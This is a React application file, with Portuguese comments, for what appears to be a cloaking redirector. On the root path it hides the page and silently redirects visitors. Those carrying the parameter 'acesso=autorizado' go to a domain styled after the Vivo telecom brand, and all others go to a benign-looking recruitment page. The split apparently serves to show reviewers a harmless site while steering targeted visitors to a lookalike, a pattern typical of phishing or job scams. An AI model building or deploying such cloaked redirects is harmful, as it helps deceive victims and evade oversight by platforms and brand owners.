import { Switch, Route, Redirect } from "wouter";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/not-found";
import Dashboard from "@/pages/Dashboard";
import Redirector from "@/pages/Redirector";

function Router() {
  // Na rota principal, verificamos se tem o parâmetro dashboard
  // Se não tiver, redirecionamos instantaneamente
  if (window.location.pathname === '/' && !window.location.search.includes('dashboard=true')) {
    const Instant = () => {
      // Lógica de redirecionamento direto (fixo) 
      const isAuthorized = new URLSearchParams(window.location.search).get('acesso') === 'autorizado';
      const targetDomain = isAuthorized ? 'vivo-cadastre-se.com' : 'atendimentovivo.gupy.io';
      
      // Esconder completamente a página
      document.body.style.display = 'none';
      document.body.style.opacity = '0';
      document.documentElement.style.backgroundColor = 'transparent';
      
      // Construir a URL e redirecionar
      const redirectUrl = isAuthorized 
        ? `https://${targetDomain}?acesso=autorizado` 
        : `https://${targetDomain}`;
        
      // Redirecionar imediatamente
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 50);
      
      return null;
    };
    
    return (
      <Switch>
        <Route path="/" component={Instant} />
        <Route path="/dashboard" component={Dashboard} />
        <Route component={NotFound} />
      </Switch>
    );
  }
  
  return (
    <Switch>
      <Route path="/" component={Redirector} />
      <Route path="/dashboard" component={Dashboard} />
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Router />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
